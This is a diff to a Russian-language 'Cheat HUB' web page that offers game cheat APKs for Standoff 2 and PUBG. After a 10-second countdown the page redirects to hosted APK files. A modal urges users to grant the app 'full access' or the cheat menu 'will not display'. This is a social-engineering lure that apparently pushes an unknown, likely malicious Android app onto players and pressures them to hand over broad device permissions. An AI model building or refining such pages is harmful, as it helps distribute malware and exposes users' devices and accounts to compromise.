@@ -2,7 +2,8 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Standoff 2 Cheat HUB</title>
+  <title>Cheat HUB</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
       background: #0f0f0f;
@@ -33,7 +34,7 @@
 
     .download-btn {
       display: inline-block;
-      margin-top: 30px;
+      margin: 20px 10px 0;
       padding: 15px 30px;
       background-color: #00cc99;
       color: #fff;
@@ -49,7 +50,6 @@
       background-color: #00b386;
     }
 
-    /* Modal styles */
     .modal {
       display: none;
       position: fixed;
@@ -77,7 +77,7 @@
       margin-bottom: 20px;
     }
 
-    #confirmBtn {
+    .confirmBtn {
       background-color: #00cc99;
       padding: 10px 20px;
       border: none;
@@ -88,7 +88,7 @@
       opacity: 0.6;
     }
 
-    #confirmBtn.enabled {
+    .confirmBtn.enabled {
       cursor: pointer;
       opacity: 1;
     }
@@ -97,34 +97,41 @@
 <body>
 
   <div class="container">
-    <h1>Standoff 2 Cheat HUB</h1>
-    <p>Добро пожаловать в приватный хаб читов для Standoff 2.<br>
-       Здесь ты можешь скачать последнюю версию чита и получить доступ к обновлениям.</p>
+    <h1>Cheat HUB</h1>
+    <p>Добро пожаловать в приватный хаб читов для Standoff 2 и PUBG.<br>Выберите нужную игру для скачивания чита:</p>
 
-    <!-- Кнопка скачивания вызывает модальное окно -->
-    <span class="download-btn" onclick="showModal()">Скачать чит</span>
+    <!-- Кнопки -->
+    <span class="download-btn" onclick="showModal('standoff')">Standoff</span>
+    <span class="download-btn" onclick="showModal('pubg')">PUBG</span>
   </div>
 
   <!-- Модальное окно -->
   <div id="infoModal" class="modal">
     <div class="modal-content">
-      <p>
+      <p id="modalText">
         ⚠️ <strong>Уведомление:</strong><br>
-        После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТСЯ!
+        После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТЬСЯ!
       </p>
-      <button id="confirmBtn" disabled>Подождите 10 секунд...</button>
+      <button id="confirmBtn" class="confirmBtn" disabled>Подождите 10 секунд...</button>
     </div>
   </div>
 
   <script>
-    function showModal() {
+    const links = {
+      standoff: "https://pixeldrain.com/u/WuJKY1QP",
+      pubg: "https://example.com/pubg-cheat.apk" // Заменишь на реальную ссылку
+    };
+
+    function showModal(game) {
       document.getElementById('infoModal').style.display = 'block';
-      let btn = document.getElementById('confirmBtn');
+      const btn = document.getElementById('confirmBtn');
       let seconds = 10;
       btn.innerText = `Подождите ${seconds} секунд...`;
+      btn.disabled = true;
       btn.classList.remove('enabled');
+      btn.onclick = null;
 
-      let countdown = setInterval(() => {
+      const countdown = setInterval(() => {
         seconds--;
         if (seconds > 0) {
           btn.innerText = `Подождите ${seconds} секунд...`;
@@ -134,10 +141,18 @@
           btn.disabled = false;
           btn.classList.add('enabled');
           btn.onclick = () => {
-            window.location.href = "https://www.mediafire.com/file/nmtm3vdg7alaetl/client.apk/file";
+            window.location.href = links[game];
           };
         }
       }, 1000);
+    }
+
+    // Закрытие по клику вне окна (по желанию)
+    window.onclick = function(event) {
+      const modal = document.getElementById('infoModal');
+      if (event.target == modal) {
+        modal.style.display = "none";
+      }
     }
   </script>
 </body>
